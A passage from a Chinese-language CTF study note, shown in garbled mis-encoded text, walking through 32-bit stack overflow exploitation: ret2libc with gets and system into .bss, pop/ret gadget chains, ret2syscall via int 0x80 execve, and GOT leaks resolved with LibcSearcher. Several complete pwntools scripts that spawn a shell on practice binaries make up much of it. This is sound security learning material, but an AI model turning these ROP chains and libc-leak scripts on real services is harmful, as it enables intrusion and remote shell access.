ˆæº¢å‡ºä¿®æ”¹è¿”å›åœ°å€ä¸ºgets_addr,ä¼ å…¥get()çš„å‚æ•°ï¼Œbä½œä¸ºgetå‡½æ•°åº•è‰²å‚æ•°ï¼Œå³å…¶ä»ç»ˆç«¯è¯»å–çš„æ•°æ®è¦å­˜å…¥çš„åœ°æ–¹\nï¼ˆ)\nï¼ˆ2ï¼‰getå‡½æ•°è¢«è°ƒç”¨åä¼šä¸ºè‡ªå·±å¼€è¾Ÿç©ºé—´ï¼Œæ‰§è¡Œæ—¶å†æ¬¡é€šè¿‡æ ˆæº¢å‡ºå¡«å…¥systemå‡½æ•°çš„åœ°å€å’Œå‚æ•°ï¼Œæœ€åè°ƒç”¨systemæ‰§è¡Œæ„é€ å¥½çš„åé—¨å‡½æ•°\n\nåˆ†æä¹‹åå¾—åˆ°åº”è¯¥æ„é€ å¦‚ä¸‹å½¢å¼çš„payload\n\nå…¶ä¸­get()å‡½æ•°å’Œsyså‡½æ•°çš„å‚æ•°éƒ½æ˜¯bssæ®µï¼Œget()ç”¨æ¥æŠŠbin&#x2F;shå†™å…¥bssæ®µï¼Œsyså’Œå®ƒæ„æˆåé—¨å‡½æ•°\ngetå†™å…¥bssæ®µçš„å†…å®¹éœ€è¦ä»ç»ˆç«¯è¯»å–ï¼Œæ‰€ä»¥ä¹‹åè¿˜è¦ä¸ºå…¶å‘é€ä¸€ä¸ªâ€œbin&#x2F;shâ€\nPayloadçš„å½¢å¼æ˜¯p32ï¼ˆgets_addrï¼‰+p32ï¼ˆsystem_addrï¼‰+p32ï¼ˆgets_p1ï¼‰+p32ï¼ˆsystem_p1ï¼‰ã€‚\nå¼€å¯äº†NXä¿æŠ¤ï¼Œå†™å’Œè¿è¡Œä¸èƒ½åŒæ—¶å®ç°ï¼Œæ‰€ä»¥æ”¹å˜è¯¥å‡½æ•°çš„å‚æ•°ä½ç½®ï¼Œæ‰€ä»¥æŠŠ /bin/shï¼‰å†™å…¥ä¸€ä¸ªå¯å†™çš„å†…å­˜åŒºåŸŸã€‚.bss æ®µæ˜¯ä¸€ä¸ªéå¸¸ç†æƒ³çš„é€‰æ‹©ï¼Œå› ä¸ºå®ƒï¼š\n\nå¯å†™ \n\né€šå¸¸ä½äºå›ºå®šçš„åœ°å€ï¼ˆç‰¹åˆ«æ˜¯åœ¨ æ²¡æœ‰å¼€å¯ ASLR çš„æƒ…å†µä¸‹ï¼‰ï¼›\n\nåœ¨ç¨‹åºè¿è¡ŒæœŸé—´æœªåˆå§‹åŒ–çš„æ•°æ®éƒ½å­˜å‚¨åœ¨è¿™é‡Œã€‚\næ‰¾bssåœ°å€\n1.readelf\nreadelf -S ret2libc2\n\n2.gdbè°ƒè¯•\ngdb ./ret2libc2    info files\n\næ˜¾ç¤ºäº†bssæ®µçš„å§‹æœ«ä½ç½®\n3.è„šæœ¬ä¸­ç›´æ¥å¾—åˆ°\nelf.bss()\n\nè„šæœ¬from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive()\n\ngdbè°ƒè¯•æ£€æŸ¥æ˜¯å¦æˆåŠŸå†™å…¥\ncä¸€ä¸‹è¿è¡Œåˆ°ä¸‹æ–­ç‚¹ä½ç½®\n\n\nè¿™ä¸ªæ—¶å€™ç¬¬ä¸€ä¸ªgetå·²ç»å®ç°ï¼Œpayloadå·²ç»ä¼ å…¥äº†\n\nä¸‹ä¸€æ­¥ä¼šè¿›å…¥æˆ‘ä»¬ä¼ è¿›å»çš„getä¸­\n\nget å’Œsystemå‡½æ•°éƒ½æ‰§è¡Œç»“æŸå\nx/s 0x0804a040å‘ç°bsså†…å­˜å…¥äº†bin&#x2F;sh\nret2libc2(å¤šä¸ªå‡½æ•°çš„ropé“¾)å‡è®¾ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶é‡Œä»…æœ‰readå‡½æ•°ï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆfdï¼Œaddrå’Œlengthï¼‰\nè¿™æ˜¯æŒ‰ç…§ä¸¤ä¸ªropé“¾å†™å‡ºçš„payloadå¡«è¡¥å½¢å¼\n\nå‡½æ•°readå› ä¸ºæ‹¥æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç›¸åº”åœ°åœ¨æ ˆä¸Šéœ€è¦æœ‰ä¸‰ä¸ªå—çš„ç©ºé—´ã€‚è¿™æ—¶ï¼Œsystemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®å°±ä¼šå’Œreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®å†²çªï¼Œå¯¼è‡´æ— æ³•å°†systemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾ç½®åœ¨æ ˆä¸Šã€‚ä¸æ–¹ä¾¿ç›´æ¥è¦†ç›–ï¼Œå› ä¸ºreadçš„å‚æ•°é™åˆ¶æ¯”è¾ƒå¤š\næ‰€ä»¥è¿™ç§æƒ…å†µå°±å¯ä»¥ç”¨pop&#x2F;retè¿›è¡Œ\n\næ³¨æ„é€‰å–çš„åŸºæœ¬åŸåˆ™ï¼šæœ‰å‡ ä¸ªå‚æ•°å°±ç”¨å‡ ä¸ªpopæŒ‡ä»¤ï¼Œæ¯”å¦‚è°ƒç”¨å®Œgetså‡½æ•°ä¹‹åï¼Œå› ä¸ºgetså‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€æœ‰å¯ä»¥å°†getså‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸º0x0804862Fï¼Œå³åªæ‰§è¡Œä¸€ä¸ªpopæŒ‡ä»¤å¼¹å‡ºå‚æ•°ä¹‹åå°±æ˜¯retæŒ‡ä»¤ï¼›æ¯”å¦‚readå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå°±æ‰¾0x0804862Dè¿™ä¸ªä½ç½®ï¼Œå› ä¸ºè¿™ä¸ªä½ç½®çš„æŒ‡ä»¤æ˜¯3ä¸ªpopæŒ‡ä»¤åŠ ä¸Šä¸€ä¸ªretæŒ‡ä»¤\nå¦‚ä½•å¯»æ‰¾è‹¥å¹²ä¸ªpopæŒ‡ä»¤è·Ÿç€retæŒ‡ä»¤\nROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;\n(ROPgadgetç”¨äºæŸ¥æ‰¾ç”¨æ¥æ”»å‡»çš„å¯æ‰§è¡Œä»£ç ç‰‡æ®µï¼Œè€Œreadlfæ˜¯ç¨‹åºçš„æ•´ä½“ç»“æ„å’Œå†…å­˜å¸ƒå±€)\n\nè„šæœ¬from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive()\n\npayload += p32(get) + p32(pop1_ret) + p32(bss):\nç›˜å­æ¯”å–»\n\nå‡†å¤‡ ROP é“¾ï¼ˆå †å ç›˜å­ï¼‰ï¼š ä½ åœ¨å†…å­˜çš„æ ˆä¸Šï¼Œä»ä¸‹å¾€ä¸Šï¼ˆä¹Ÿå°±æ˜¯ä»ä½åœ°å€å¾€é«˜åœ°å€ï¼Œå› ä¸ºæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼‰ï¼Œåƒå †å ç›˜å­ä¸€æ ·æ”¾äº†ä¸€ç³»åˆ—åœ°å€ã€‚ å‡è®¾ä½ çš„ ROP é“¾ç‰‡æ®µæ˜¯ï¼šA (getåœ°å€), B (pop ebp; retåœ°å€), C (bssåœ°å€)ã€‚\næ ˆä¸Šçš„ç›˜å­ï¼š\n... (å…¶ä»–æ•°æ®)[ C ç›˜å­ (bssåœ°å€) ]  &lt;-- ä½äºæ ˆä¸Šè¾ƒé«˜ä½ç½®[ B ç›˜å­ (pop ebp; retåœ°å€) ][ A ç›˜å­ (getåœ°å€) ]  &lt;-- ä½äºæ ˆä¸Šè¾ƒä½ä½ç½®ï¼Œæœ€å…ˆè¢«ç¨‹åºâ€œçœ‹åˆ°â€\n\nå½“ç¨‹åºè¿”å›æ—¶ï¼Œä¼šå…ˆâ€œæ‹¿èµ·â€æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆAï¼‰ã€‚\n\næ‰§è¡Œ get å‡½æ•°ï¼ˆä½¿ç”¨ A ç›˜å­ï¼‰ï¼š\n\nç¨‹åºå› ä¸ºæ ˆæº¢å‡ºè¢«åŠ«æŒï¼Œå®ƒä¼šè·³åˆ° get å‡½æ•°çš„åœ°å€ï¼ˆA ç›˜ï¼‰ã€‚\nget å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚å®ƒéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€æ¥å­˜æ”¾å®ƒè¯»å–çš„æ•°æ®ã€‚\nget å‡½æ•°ä¼šå»â€œçœ‹â€å®ƒè‡ªå·±è¿”å›åœ°å€ä¸Šæ–¹çš„â€œç›˜å­â€ï¼Œä¹Ÿå°±æ˜¯ C ç›˜å­ (bssåœ°å€)ã€‚\næ‰€ä»¥ï¼ŒC ç›˜å­ (bssåœ°å€) è¢« get å‡½æ•°å½“ä½œäº†å®ƒçš„å‚æ•°ï¼Œget ä¼šå°†ä½ é€šè¿‡ p.sendline(&quot;/bin/sh&quot;) å‘é€çš„æ•°æ®å†™å…¥åˆ° C ç›˜å­ æ‰€æŒ‡ç¤ºçš„å†…å­˜åŒºåŸŸï¼ˆå³ bss æ®µï¼‰ã€‚\nget å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå®ƒéœ€è¦â€œè¿”å›â€ã€‚å®ƒä¼šä»æ ˆä¸Šå–å›å®ƒçš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯ç´§é‚»å…¶ä¸‹çš„ B ç›˜å­ (pop ebp; retåœ°å€)ã€‚\n\n\næ‰§è¡Œ pop ebp; ret gadgetï¼ˆä½¿ç”¨ B ç›˜å­ï¼‰ï¼š\n\nç¨‹åºè·³è½¬åˆ° B ç›˜å­ (pop ebp; retåœ°å€)ã€‚\nç°åœ¨ï¼ŒB ç›˜å­ å†…éƒ¨çš„æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼š\npop ebpï¼š è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆé¡¶çš„é‚£ä¸ªç›˜å­ã€‚æ­¤æ—¶æ ˆé¡¶å°±æ˜¯ C ç›˜å­ (bssåœ°å€)ã€‚æ‰€ä»¥ï¼ŒC ç›˜å­ (bssåœ°å€) ä¼šè¢«å¼¹å‡ºå¹¶æ”¾å…¥ ebp å¯„å­˜å™¨ã€‚è¿™ä¸ªæ“ä½œç›¸å½“äºæŠŠ C ç›˜å­ ä»æ ˆä¸­æ‹¿èµ°äº†ã€‚\nretï¼š è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆä¸­ç°åœ¨æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆä¹Ÿå°±æ˜¯ C ç›˜å­ è¢«æ‹¿èµ°åæš´éœ²å‡ºçš„ä¸‹ä¸€ä¸ªç›˜å­ï¼‰ï¼Œå¹¶è·³è½¬åˆ°é‚£ä¸ªç›˜å­ä¸Šçš„åœ°å€ã€‚è¿™ä¸ªç›˜å­å°±æ˜¯ä½  ROP é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ï¼ˆä¾‹å¦‚ sys å‡½æ•°çš„åœ°å€ï¼‰ã€‚\n\n\n\n\n\nret2syscall(åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€)\n\nå¼€å¯äº†NXä¿æŠ¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ ROPé“¾å®ç°è·³è½¬ï¼Œè€Œä¸æ”¹å˜æ•°æ®æ®µçš„æ•°å€¼\né™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä¸Šé¢æœ‰æ•ˆçš„ä¸œè¥¿äº†,æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­éƒ½æ²¡æœ‰systemå‡½æ•°\næ‰€ä»¥è‡ªå·±ä¸ºå¯„å­˜å™¨èµ‹å€¼ä»¥æ„é€ åé—¨å‡½æ•°ã€‚ä¸”è°ƒç”¨çš„int 0x80è¦æ”¾åœ¨æœ€ä¸Šé¢ï¼Œè°ƒç”¨æ—¶ï¼Œä»ä¸‹å¾€ä¸Šå¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œåˆ°è°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œè¯¥å‡½æ•°çš„å‚æ•°å¿…é¡»å‡†å¤‡å¥½ã€\næ ¹æ®å‘½ä»¤æ‰¾åˆ°&#x2F;bin&#x2F;shå­—ç¬¦æ®µ å’Œint 0x80çš„è°ƒç”¨å‘½ä»¤ä»¥åŠéœ€è¦çš„pop|retå‘½ä»¤\n\nè„šæœ¬from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive()\n\n\n\nç¼–è¯‘çŸ¥è¯†ï¼ˆ1ï¼‰é™æ€ç¼–è¯‘ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæå–å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦è°ƒç”¨çš„å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆ.soï¼‰ä¸­çš„éƒ¨åˆ†ï¼Œå¹¶é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­\nå»ï¼Œä½¿å¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œçš„æ—¶å€™ä¸ä¾èµ–äºåŠ¨æ€é“¾æ¥åº“ã€‚\nï¼ˆ2ï¼‰åŠ¨æ€ç¼–è¯‘ã€‚åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦é™„å¸¦ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨æ‰§è¡Œæ—¶ï¼Œéœ€è¦è°ƒç”¨å…¶å¯¹åº”åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‘½ä»¤ã€‚æ‰€ä»¥ï¼Œå…¶ä¼˜ç‚¹ä¸€æ–¹é¢æ˜¯\nç¼©å°äº†å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œä¼˜ç‚¹åŠ å¿«äº†ç¼–è¯‘é€Ÿåº¦ï¼ŒèŠ‚çœäº†ç³»ç»Ÿèµ„æºã€‚ç¼ºç‚¹ä¸€æ–¹é¢æ˜¯å“ªæ€•å¾ˆç®€å•çš„ç¨‹åºï¼Œåªè¦ç”¨åˆ°äº†é“¾æ¥åº“ä¸­çš„ä¸€ä¸¤æ¡å‘½ä»¤ï¼Œä¹Ÿè¦é™„å¸¦ä¸€ä¸ªåºå¤§çš„é“¾æ¥åº“ï¼›å¦ä¸€æ–¹é¢æ˜¯å¦‚æœå…¶ä»–è®¡ç®—æœºä¸Šæ²¡æœ‰å®‰è£…å¯¹åº”çš„è¿è¡Œåº“ï¼Œåˆ™ç»è¿‡åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶å°±ä¸èƒ½è¿è¡Œã€‚\né™æ€ç¼–è¯‘çš„ä¼˜ç¼ºç‚¹ä¸åŠ¨æ€ç¼–è¯‘æ­£å¥½ç›¸åã€‚\né™æ€ç¼–è¯‘å¯ä»¥ç®€å•ç†è§£ä¸ºå°†åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ‹·è´å‡ºæ¥æ”¾å…¥å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶é‡Œã€‚\nå¯„å­˜å™¨\nåœ¨32ä½ç³»ç»Ÿä¸­ï¼Œé€šè¿‡int 0x80æŒ‡ä»¤è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚å…¶ä¸­ï¼ŒEAXå¯„å­˜å™¨ç”¨äºä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œå‚æ•°æŒ‰é¡ºåºèµ‹å€¼ç»™EBXã€ECXã€EDXã€ESIã€\nEDIã€EBPè¿™6ä¸ªå¯„å­˜å™¨ã€‚\nåœ¨64ä½ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨syscallæŒ‡ä»¤æ¥è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ ·ä½¿ç”¨EAXï¼ˆRAXï¼‰å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼ŒRDIã€RSIã€RDXã€RCXã€R8ã€R9\nè¿™6ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ é€’å‚æ•°ã€‚\n\neg:readï¼ˆ0,buf,0x100ï¼‰\n32ä½æ—¶ï¼Œeax&#x3D;3ï¼ˆ#define__NR_read 3ï¼‰;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚å®é™…ä¸Šï¼Œæœ€åè¿˜ä¼šè¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚\n64ä½æ—¶ï¼Œrax&#x3D;0ï¼ˆ#define__NR_read 0ï¼‰;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡ŒsyscallæŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚\nä¹Ÿæ˜¯è¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚\nå¦‚æœæƒ³è¦å®ŒæˆGet shell\n32ä½æ—¶ï¼Œï¼šeax&#x3D;11ï¼ˆ#define__NR_execve 11ï¼‰;ebx&#x3D;â€&#x2F;bin&#x2F;shâ€;ecx&#x3D;0;edx&#x3D;0;ï¼ˆNULLå®é™…ä¸Šå°±æ˜¯0ï¼‰ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„execveï¼ˆâ€&#x2F;bin&#x2F;shâ€,NULL,NULLï¼‰ã€‚\n64ä½æ—¶ï¼Œrax&#x3D;59ï¼ˆ#define__NR_execve 59ï¼‰;rdi&#x3D;â€&#x2F;bin&#x2F;shâ€;rsi&#x3D;0;rdx&#x3D;0;\n\nåœ¨idaä¸­çº¢è‰²ä¸ºå¤–éƒ¨å‡½æ•°ï¼Œç™½è‰²ä¸ºå†…éƒ¨å‡½æ•°\né™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å…¨ä¸ºå†…éƒ¨å‡½æ•°\nret2libc3\nè„šæœ¬from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# æ³„éœ² gets åœ°å€p.recvuntil(&quot;ret2libc3\\n&quot;)payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# è·å–æ³„éœ²åœ°å€leak_addr = u32(p.recv(4))# ç”¨ LibcSearcher æŸ¥libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher ä¼šæ ¹æ®ä½ æä¾›çš„å‡½æ•°åå’Œåœ°å€ï¼Œå»åŒ¹é…å·²çŸ¥çš„ libc æ•°æ®åº“libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)æ˜¯gets å‡½æ•°åœ¨ libc ä¸­çš„åç§»ï¼ˆç›¸å¯¹äº libc åŸºåœ°å€ï¼‰system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#è¾“å‡ºè¿™ä¸ªè®¡ç®—å‡ºçš„åœ°å€ï¼Œä¾¿äºæ£€æŸ¥# ç¬¬äºŒæ¬¡æ”»å‡»p.recvuntil(&quot;ret2libc3\\n&quot;)payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive()\n\n\n\npayload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)\nè°ƒç”¨putå‡½æ•°æ³„éœ²getså‡½æ•°çš„å®é™…åœ°å€ï¼Œå¹¶ä¸”è¿”å›mainå‡½æ•°ï¼Œå†æ¬¡åˆ©ç”¨gotæ¼æ´\nå®ƒå†…éƒ¨ä½¿ç”¨çš„æ˜¯ é¢„å®šä¹‰ç¬¦å·å ï¼Œæ¯”å¦‚ï¼š\n\n&quot;system&quot;\n&quot;gets&quot;\n&quot;printf&quot;\n&quot;str_bin_sh&quot; ï¼ˆå°±æ˜¯ä½ è¦æ‰¾çš„ /bin/shï¼‰\n\nè¿™äº›åå­—ä¸æ˜¯éšä¾¿å†™çš„ï¼Œæ˜¯é¢„å…ˆåœ¨ libc æ•°æ®åº“ä¸­å®šä¹‰å¥½çš„ç¬¦å·åç§°ã€‚\nè„šæœ¬æ‰§è¡Œåä¼šæ˜¾ç¤º\n\nè¿™æ˜¯å› ä¸ºç”¨libc &#x3D; LibcSearcher(â€œgetsâ€, leak_addr)è¿›è¡Œé€‰æ‹©é€‚åˆçš„libcåº“ï¼Œä½†ä¸åŒç‰ˆæœ¬çš„libc.soæ–‡ä»¶çš„å˜åŒ–ä¸å¤§ï¼Œä¸€ä¸ªå‡½æ•°çš„åœ°å€çº¦æŸä¸å¤Ÿä¸¥æ ¼ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤ºå¤šä¸ªlibcç‰ˆæœ¬ä¾›é€‰æ‹©\nè§£å†³å¤šä¸ªlibc.soç‰ˆæœ¬ä¾›é€‰æ‹©1.å¤šä¸ªçº¦æŸæ¡ä»¶\nå“ªäº›ç¬¦å·æœ€ç¨³å¦¥\nè¿™æ˜¯ä¸ªå¾ˆé‡è¦çš„é—®é¢˜ï¼š\n\nä¸ºä»€ä¹ˆæ³„éœ² gets &#x2F; puts &#x2F; printfï¼Œä¸æ³„éœ² malloc &#x2F; exit &#x2F; system å‘¢ï¼Ÿ\n\nç†ç”±ï¼š\n\n\n\nç¬¦å·\nç¨³å¦¥ç¨‹åº¦\nåŸå› \n\n\n\nputs\nğŸ‘\nå‡ ä¹æ¯ä¸ª libc é‡Œéƒ½æœ‰ï¼Œåç§»ç‹¬ç‰¹\n\n\nprintf\nğŸ‘\nå¸¸è§ï¼Œåç§»ç‹¬ç‰¹\n\n\ngets\nğŸ‘ï¼ˆä½†æ˜¯ glibc2.28+ è¢«åºŸå¼ƒäº†ï¼‰\n\n\n\nread\nğŸ‘\næ ¸å¿ƒ IOï¼Œå­˜åœ¨ä¸”ç¨³å®š\n\n\nwrite\nğŸ‘\nå’Œ read å¯¹åº”\n\n\nsystem\nğŸ‘\nå¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯æœ‰çš„ libc æŠŠå®ƒé™æ€é“¾æ¥äº†æˆ–è€…ä½ç½®å¾ˆå¸¸è§\n\n\nexit\nğŸ‘\nåç§»è¾ƒå°ä¸”å¸¸è§ï¼Œä¸å»ºè®®ç”¨\n\n\n__libc_start_main\nğŸ‘\néå¸¸ç¨³å¦¥ï¼Œé€šå¸¸ä¸ä¼šå†²çª\n\n\nå› æ­¤å»ºè®®ä½ æ³„éœ²çš„ä¼˜å…ˆçº§æ˜¯ï¼š\nputs &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets\n\nç†æƒ³çŠ¶æ€ä¸‹ï¼Œä½ ä¸€æ¬¡æ€§æ³„éœ²ä¸‰ä¸ªç¬¦å·ï¼Œæ¯”å¦‚ï¼š\nputs(gets@got);puts(puts@got);puts(printf@got);\n\nç„¶åç”¨ä¸‰ä¸ªç¬¦å·å»æŸ¥åº“ï¼Œå‡ ä¹100%å”¯ä¸€\nä½†æ˜¯\nå½“ç¨‹åºç¼–è¯‘æ—¶ï¼Œåªæœ‰çœŸæ­£è¢«è°ƒç”¨çš„å¤–éƒ¨åº“å‡½æ•°æ‰ä¼šè¢«é“¾æ¥ï¼Œå¹¶ä¸”å®ƒä»¬æ‰ä¼šåœ¨ GOT è¡¨é‡Œæœ‰æ¡ç›®ã€‚\nè€Œä½ çš„ç›®æ ‡ç¨‹åº ./ret2libc3 é‡Œï¼š\nbashå¤åˆ¶ç¼–è¾‘gets, puts æœ‰ç”¨åˆ°printf æ²¡ç”¨åˆ°\n\næ‰€ä»¥ï¼šåªèƒ½æœ‰ä¸¤ä¸ªçº¦æŸæ¡ä»¶\ncsså¤åˆ¶ç¼–è¾‘elf.got[&quot;gets&quot;] âœ… å­˜åœ¨elf.got[&quot;puts&quot;] âœ… å­˜åœ¨elf.got[&quot;printf&quot;] âŒ æŠ¥é”™\n\nè„šæœ¬\nfrom pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#putsçš„gotè¡¨main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#è¾“å‡ºputsçš„å®é™…ä½ç½®p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#æ¥æ”¶å…¶ä½ç½®libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#å¢åŠ putsçš„ä½ç½®ä½œä¸ºçº¦æŸæ¡ä»¶libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive()\n\nä½†æ˜¯è¿™ä¸ªæˆ‘å°è¯•è¿‡å¯¹è¿™ä¸ªé¢˜ç›®æ¥è¯´è¿˜æ˜¯çº¦æŸæ¡ä»¶å¤ªå°‘ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªé¢˜ç›®è°ƒç”¨å‡½æ•°æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºçº¦æŸçš„å‡½æ•°ä¹Ÿæ¯”è¾ƒå°‘\n1ï¼‰GOTã€‚GOTæ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚\n2ï¼‰PLTæ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage 